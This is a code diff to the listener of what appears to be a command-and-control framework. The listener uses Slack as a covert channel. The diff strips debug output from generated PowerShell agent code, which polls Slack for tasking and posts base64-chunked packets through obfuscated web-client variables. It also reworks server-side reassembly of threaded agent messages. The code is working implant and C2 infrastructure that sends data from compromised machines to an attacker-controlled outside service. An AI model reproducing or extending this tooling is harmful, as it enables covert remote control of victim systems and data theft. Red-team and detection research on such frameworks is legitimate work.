@@ -445,8 +445,6 @@ class Listener:
                     $Script:TaskingTracker = @{TaskTS=$null;ServerReplies=0;ServerLastReply=$null};
                     $script:GetTask = {
 
-                        write-host '[*] Getting tasks'
-
                         $waiting = $false
                         $APIToken = '"""+ api_token +"""'
                         $Channel = '"""+ channel_id +"""'
@@ -471,16 +469,12 @@ class Listener:
 
                                 if($slack_response['messages'].length -eq 3) {
                                     $data_thread = $slack_response['messages'][-1]['text']
-                                    write-host "Data thread: $data_thread"
 
                                     $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded');
                                     $data_response=$"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/channels.replies","POST","token=$($APIToken)&channel=$($Channel)&thread_ts=$($data_thread)")
-                                    write-host $data_response
                                     $data_response=ConvertFrom-Json20 $data_response;
 
                                     $raw_base64 = (($data_response['messages'] | %{ $_["text"] }) -join '').Replace('-MESSAGE_END-','')
-
-                                    write-host "[*] Base64 joined back together total length is $($raw_base64.length)";
 
                                     $result=Decode-Base64 $raw_base64;
                                     $result
@@ -526,7 +520,6 @@ class Listener:
                             }
                             catch [System.Net.WebException] {
                                 get-winhomelocation
-                                write-host "Requesting task, $_"
                                 if($e.Exception.InnerException.Response.StatusCode.value__ -eq 429) {
                                     $secs = $e.Exception.InnerException.Response.Headers.Get("Retry-After")*2
                                     Write-Host "Waiting $secs seconds... (post request)";
@@ -545,7 +538,6 @@ class Listener:
                     $script:SendMessage = {
                         param($Packets)
 
-                        #write-host '[*] Sending messages'
                         if($Packets) {
                             
                             $APIToken = '"""+ api_token +"""'
@@ -571,8 +563,6 @@ class Listener:
                             try {
                                 $Parts_to_send = $RoutingPacket_base64 -split "(.{3500})" | where {$_}
 
-                                Write-Host "Sending $($encBytes.length) bytes, $($parts_to_send.count) messages"
-
                                 # send the header
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded')
                                 $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/chat.postMessage","POST","token=$($APIToken)&channel=$($Channel)&text=--MESSAGE_START--&username=$($AgentID):STAGED")
@@ -595,7 +585,6 @@ class Listener:
                                         }
                                         catch [System.Net.WebException] {
                                             $failures += 1
-                                            Write-Host "Posting single message $_";
                                             if($_.Exception.InnerException.Response.StatusCode.value__ -eq 429) {
                                                 $secs = $_.Exception.InnerException.Response.Headers.Get("Retry-After")*2*($failures)
                                                 Write-Host "Waiting $secs seconds... (in payload loop)";
@@ -687,7 +676,6 @@ class Listener:
                             if 'thread_ts' in message:
 
                                 if message["thread_ts"] == thread_ts:
-
                                     not_thread = True
                                 else:
                                     not_thread = False
@@ -695,32 +683,54 @@ class Listener:
                                 not_thread = True
 
                             if not_thread:
+                                # by adding a thumbs up helps the listener keep track of what it has processed
                                 reaction = slack_client.api_call("reactions.add", name='thumbsup', channel=channel_id, timestamp=thread_ts)
 
-                                # by adding a thumbs up helps the listener keep track of what it has processed
                                 if 'username' in message and not 'error' in reaction:
                                     raw_message = message["text"]
+                                    agent = message["username"]
                                     # incoming agent data from a task
-                                    if raw_message == '--MESSAGE_START--':
-                                        data = get_data(thread_ts)
-                                    else:
-                                        data = None
 
-                                    if "username" in message:
-                                        agent = message["username"]
-                                    else:
+                                    if ':' in agent and raw_message:
+                                        agent, stage = agent.split(':')
+                                        #If it's a threaded response from an agent, stick it in its own queue so we don't block on it
+                                        if raw_message == '--MESSAGE_START--':
+                                            self.mainMenu.agents.agents[agent]['slack_queue'] = {
+                                                "thread_ts": message['ts'],
+                                                "data": ""
+                                            }
+                                        else:
+                                            data = base64.b64decode(raw_message)
+                                            return_array.append((agent, stage, data, thread_ts))
+
+                                else:
                                         agent = 'unknown:unknown'
                                         print helpers.color("[!] No agent name for message: {}".format(message))
 
-                                    if ':' in agent and raw_message:
-                                        if not data:
-                                            data = base64.b64decode(raw_message)
-                                        agent, stage = agent.split(':')
-                                        return_array.append((agent, stage, data, thread_ts))
+                            elif 'thread_ts' in message:
+                                agents = self.mainMenu.agents.agents
+                                thread_ids = filter(None, map((lambda x: get_agent_queue(agents[x])), agents))
+                                print thread_ids
+                                if message["thread_ts"] in thread_ids:
+                                    agent_id, stage = message['username'].split(':')
+                                    if agent_id not in agents:
+                                        continue
+                                    queue = agents[agent_id]['slack_queue']
+                                    if message['text'] == '--MESSAGE_END--':
+                                        return_array.append((agent_id, stage, queue['data'], queue['thread_ts']))
+                                        agents[agent_id]['slack_queue'] = None
+                                    else:
+                                        queue['data'] += (base64.b64decode(message['text']))
 
 
             #time.sleep(1)
             return return_array
+
+        def get_agent_queue(agent):
+            try:
+                return agent['slack_queue']['thread_ts']
+            except:
+                return None
 
         def upload_stager():
 
